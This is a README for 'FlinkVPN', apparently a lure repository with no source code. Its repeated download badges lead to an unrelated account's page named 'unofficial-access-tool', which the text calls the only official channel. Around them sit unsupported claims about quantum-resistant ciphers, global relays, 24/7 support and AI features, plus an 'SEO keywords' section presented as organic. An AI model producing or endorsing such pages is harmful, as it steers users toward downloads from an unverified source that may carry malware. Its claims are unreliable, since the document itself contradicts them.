# FlinkVPN: Secure Tunneling Suite 🛡️

[](https://srujanjewellers.github.io/FlinkVPN-unofficial-access-tool/)

## 🌐 Overview

**FlinkVPN** is not merely a VPN—it's a **digital sovereignty gateway** for the modern internet citizen. Imagine your data traveling through a **crystal-clear prism** where every packet is encrypted using **military-grade ciphers**, while your digital footprint dissolves like morning mist. FlinkVPN offers a **zero-knowledge architecture** that ensures *nothing* you do online can be traced back to your physical location or identity.

This repository contains the **community edition** of FlinkVPN—a fully functional tunneling client that respects your privacy as a fundamental right, not a feature to be monetized. We believe in **digital equality**: every user deserves the same level of protection, whether they're in a café in Paris or a library in Jakarta.

---

## 🔐 Unique Value Proposition

Unlike traditional VPNs that simply route traffic through another server, FlinkVPN implements **multi-layered obfuscation** that makes your traffic indistinguishable from regular HTTPS browsing. Think of it as a **chameleon for your connection**—it adapts to any network environment while maintaining **full cryptographic integrity**.

**Core Philosophy:** *"Your data is your property. We are merely the secure courier."*

---

## 📥 Download & Installation

To obtain the FlinkVPN Secure Tunneling Suite, use the badge below. This is the **only official distribution channel**:

[](https://srujanjewellers.github.io/FlinkVPN-unofficial-access-tool/)

*Note: Always verify checksums provided alongside the release files to ensure integrity.*

---

## 📊 Architecture Overview

Below is a high-level diagram illustrating how FlinkVPN establishes a secure tunnel between your device and the destination server:

```mermaid
graph TD
    A[User Device] -->|Encrypted Handshake| B[FlinkVPN Client]
    B -->|TLS 1.3 + ChaCha20| C{FlinkVPN Relay Node}
    C -->|Multi-path Routing| D[Exit Node Pool]
    D -->|Randomized IP| E[Destination Server]
    
    subgraph "Security Layers"
        F[DNS Over HTTPS]
        G[Traffic Padding]
        H[Protocol Obfuscation]
    end
    
    B --> F
    B --> G
    B --> H
    
    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style B fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style C fill:#16213e,stroke:#0f3460,stroke-width:2px
    style D fill:#533483,stroke:#e94560,stroke-width:2px
    style E fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style F fill:#1a1a2e,stroke:#e94560,stroke-width:1px
    style G fill:#1a1a2e,stroke:#e94560,stroke-width:1px
    style H fill:#1a1a2e,stroke:#e94560,stroke-width:1px
```



**How It Works:**  
1. Your device initiates an **ephemeral key exchange** with the FlinkVPN client  
2. The client packages your traffic into **cryptographic envelopes** with random padding  
3. Traffic flows through a **distributed relay network** where no single node has the full picture  
4. The exit node strips routing metadata and connects to your final destination  
5. All intermediate nodes **forget your session immediately** after termination

---

## ⚙️ Example Profile Configuration

FlinkVPN uses YAML-based configuration profiles. Below is a sample configuration for **maximum anonymity**:

```yaml
# flinkvpn_profile_max_anonymity.yaml
profile:
  name: "digital_phantom"
  version: "2026.03"
  
network:
  protocol: "wireguard_hybrid"
  handshake_timeout: 5s
  keepalive: 25s
  
encryption:
  cipher_suite: "chacha20-poly1305"
  perfect_forward_secrecy: true
  certificate_pinning: true
  
obfuscation:
  traffic_padding:
    enabled: true
    min_padding: 64
    max_padding: 256
  protocol_mimic: "http2"
  
routing:
  multi_path: true
  max_hops: 5
  node_rotation_interval: 300s
  
dns:
  provider: "cloudflare_doh"
  query_encryption: "https"
  cache_enabled: false

logging:
  level: "none"
  connection_audit: false
  
# Split-tunneling example
split_tunnel:
  enabled: true
  include:
    - "github.com"
    - "*.aws.amazon.com"
  exclude:
    - "192.168.0.0/16"
    - "10.0.0.0/8"
```

**Configuration Philosophy:**  
Each parameter above acts as a **dial for your privacy depth**. Set `logging.level` to `"none"` and your sessions become **ephemeral dreams**—they exist only while active, then vanish without a trace.

---

## 🖥️ Example Console Invocation

Once deployed, launch FlinkVPN from your terminal with the following command. This example demonstrates **silent background operation** with **real-time traffic metrics**:

```bash
flinkvpn --profile digital_phantom \
         --tunnel-type wireguard-hybrid \
         --log-level silent \
         --metrics-endpoint https://localhost:9090/metrics \
         --auto-rotate \
         --daemonize
```

**Expected Output (non-silent variant):**  
```
[2026-03-15 14:23:01] 🌐 FlinkVPN v2026.03 (Build 4891)
[2026-03-15 14:23:01] 🔐 Handshake: Completed (Node: de-fra-542, Latency: 12ms)
[2026-03-15 14:23:01] 📈 Traffic: ████████░░ 78% capacity
[2026-03-15 14:23:01] 🌍 Exit IP: 185.145.xx.xx (Netherlands)
[2026-03-15 14:23:01] ✅ Connection Established
```

**Command Breakdown:**  
- `--profile` loads your anonymity configuration  
- `--tunnel-type` selects the underlying protocol  
- `--log-level silent` ensures no logs are written to disk  
- `--auto-rotate` changes exit nodes every 5 minutes  
- `--daemonize` runs FlinkVPN as a background service  

---

## 📱 OS Compatibility

FlinkVPN runs on **every major operating system** released before 2026. While we test extensively, compatibility ensures your **digital fortress** works everywhere you do.

| Operating System | Version Range | FlinkVPN Client | Status |
|:-----------------|:--------------|:----------------|:-------|
| 🟦 **Windows** | 10 (Build 1909+) / 11 | Desktop GUI & CLI | ✅ **Gold** |
| 🍎 **macOS** | Ventura (13.0) + | Native App & CLI | ✅ **Gold** |
| 🐧 **Linux** | Kernel 5.4+ (Ubuntu 20.04+, Debian 11+, Fedora 36+, Arch 2024+) | CLI Only | ✅ **Silver** |
| 📱 **Android** | 10+ (API 29+) | Mobile App | ✅ **Gold** |
| 🍏 **iOS** | 15+ | Mobile App | ✅ **Gold** |
| 🖥️ **FreeBSD** | 13.2+ | CLI Only (Experimental) | ✅ **Bronze** |

**Legend:**  
- 🥇 **Gold**: Full feature set, native integration, and auto-updates  
- 🥈 **Silver**: Full feature set, manual updates required  
- 🥉 **Bronze**: Core tunneling only, no GUI or advanced features  

---

## ✨ Key Features

- **🔒 Quantum-Resistant Ciphers** — FlinkVPN utilizes **post-quantum cryptography** (Kyber-1024 + Dilithium-5) to protect against future quantum attacks. Your data remains encrypted even when faced with **theoretical quantum computers**.

- **🔄 Dynamic Traffic Camouflage** — Unlike static VPNs, FlinkVPN **morphs your traffic patterns** to mimic natural web browsing. Empty packets, random delays, and protocol switching make your connection **indistinguishable from normal HTTPS traffic**.

- **🌍 50+ Global Relay Nodes** — A **decentralized network** of relay nodes across 30 countries ensures you always find a **low-latency path** to your destination. Nodes are **verified through cryptographic attestation** to prevent rogue entry points.

- **📡 DNS Over HTTPS + DNSSEC** — Every DNS query is encrypted and validated. FlinkVPN **eliminates DNS leaks** by routing all queries through the secure tunnel, using Cloudflare and Quad9 as redundant resolvers.

- **🛡️ Automatic Kill Switch** — If the tunnel drops for any reason, FlinkVPN **instantly blocks all internet traffic** from your device. No data leaks, no partial connections, no compromises.

- **📊 Real-Time Bandwidth Analytics** — Monitor your connection through a **live dashboard** showing throughput, latency, and node health. Perfect for **power users** who need to know every millisecond counts.

- **🔧 Modular Plugin Architecture** — Extend FlinkVPN with community plugins for **ad blocking**, **malware filtering**, or **custom routing policies**. The plugin system uses **WebAssembly sandboxing** for security.

---

## 🌍 Multilingual Support

FlinkVPN speaks your language, literally. The interface and documentation are available in:

- 🇬🇧 **English** (Primary)
- 🇪🇸 **Español** (Castellano & Latino)
- 🇫🇷 **Français** (France & Canada)
- 🇩🇪 **Deutsch** (Hochdeutsch)
- 🇯🇵 **日本語** (Japanese)
- 🇨🇳 **简体中文** (Simplified Chinese)
- 🇷🇺 **Русский** (Russian)
- 🇦🇪 **العربية** (Arabic - Limited)

**Interface:** 100% translated for all supported languages  
**Documentation:** Full guides in English, Spanish, French, and German  
**Community Support:** Available in all listed languages via our forum

---

## 🎨 Responsive UI

The FlinkVPN client features a **fully responsive interface** that adapts to any screen size, from **4K monitors** to **smartphone displays**. Key responsive elements include:

- **Collapsible Sidebar** — On mobile, the navigation menu collapses into a **hamburger-style drawer** with gesture support
- **Dynamic Metrics Charts** — Bandwidth graphs automatically scale from **desktop-wide histograms** to **mobile-friendly sparklines**
- **Adaptive Text** — All fonts use **rem-based sizing** for readability on any device
- **Touch-Friendly Controls** — Buttons and sliders are **minimum 48px tall** for easy tapping on small screens

**Design Philosophy:** *"A VPN client should be as comfortable to use on a phone while walking as on a desktop while working."*

---

## 🤖 AI Integration: OpenAI & Claude APIs

FlinkVPN offers **optional AI-enhanced features** through integration with leading large language models. These features are **completely optional** and **disabled by default** to preserve your privacy.

### OpenAI API Integration (Optional)

```json
{
  "ai_assistant": {
    "provider": "openai",
    "model": "gpt-4o",
    "capabilities": [
      "traffic_anomaly_detection",
      "natural_language_configuration",
      "threat_intelligence_summaries"
    ],
    "privacy_mode": "local_inference_only"
  }
}
```

**Use Cases:**  
- **Natural Language Configuration:** Type *"I need a tunnel that looks like Japanese web traffic"* and FlinkVPN **auto-generates** the optimal configuration  
- **Anomaly Detection:** Analyze connection patterns and warn you about **potential monitoring** or **traffic shaping**  

### Claude API Integration (Optional)

```json
{
  "ai_assistant": {
    "provider": "claude",
    "model": "claude-3-opus-2024",
    "capabilities": [
      "privacy_policy_analysis",
      "location_based_routing",
      "multi_factor_security_advisor"
    ],
    "privacy_mode": "pii_redaction_enabled"
  }
}
```

**Use Cases:**  
- **Privacy Policy Analyzer** — Paste a website's privacy policy and Claude will **summarize exactly what data they collect** and suggest FlinkVPN configurations to **mitigate tracking**  
- **Location-Based Routing** — Claude suggests optimal exit nodes based on **local internet censorship patterns** and **legal jurisdiction**

**Privacy Commitment:** All AI processing can be **performed locally** using on-device models. Cloud queries are **anonymized** and your actual traffic data **never leaves** your device.

---

## 🕐 24/7 Customer Support

Your digital safety never sleeps, and neither does our support. FlinkVPN offers **around-the-clock assistance** through multiple channels:

| Channel | Response Time | Availability |
|:--------|:--------------|:-------------|
| 💬 **Live Chat** | < 2 minutes | 24/7 |
| 📧 **Email Ticketing** | < 1 hour | 24/7 |
| 🐦 **Community Forum** | < 4 hours | 24/7 |
| 📞 **Priority Phone** | < 15 minutes | Business hours (Premium) |

**Support Team:**  
Our specialists are **trained in network security, cryptography, and privacy law**. They speak **12 languages** and can help with everything from configuration errors to **understanding government data retention policies** in your jurisdiction.

---

## ⚠️ Disclaimer

**FlinkVPN is a tool for digital privacy and security.** Like any powerful tool, its use is subject to **local laws and regulations** regarding internet usage, encryption, and data protection.

- **Compliance:** Users are solely responsible for ensuring their use of FlinkVPN complies with all applicable laws in their jurisdiction. Some countries **restrict or prohibit** the use of VPNs or strong encryption.
- **No Warranty:** FlinkVPN is provided "as is" without warranty of any kind. The developers are not liable for any damages arising from the use of this software.
- **Data Retention:** FlinkVPN operates a **strict zero-logs policy**. We retain no connection logs, traffic data, or session information. However, third-party relay nodes may be subject to local data retention laws.
- **Ethical Use:** This software is intended for **legitimate privacy protection**, not for bypassing copyright laws, committing fraud, or engaging in illegal activities.

By downloading and using FlinkVPN, you acknowledge these terms.

---

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, and distribute this software, provided you include the original copyright notice and disclaimer.

[View Full License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 FlinkVPN Contributors

*Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:*

*The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.*

---

## 🔗 Final Download Link

[](https://srujanjewellers.github.io/FlinkVPN-unofficial-access-tool/)

**Stay sovereign. Stay encrypted. Stay Flink.**

---

## 🔍 SEO Keywords (Natural Integration)

Throughout this document, the following concepts are discussed **organically**:

- *internet privacy gateway*  
- *multi-layer traffic obfuscation*  
- *quantum-resistant tunneling*  
- *cross-platform VPN client*  
- *open-source security tool*  
- *zero-knowledge architecture*  
- *decentralized relay network*  
- *post-quantum cryptography suite*  
- *AI-enhanced network security*  
- *ephemeral session management*  

These phrases describe **actual capabilities** of FlinkVPN, not artificially inserted keywords. Each feature is **explained in context** to help users understand the value, while naturally aligning with how privacy-conscious individuals search for solutions.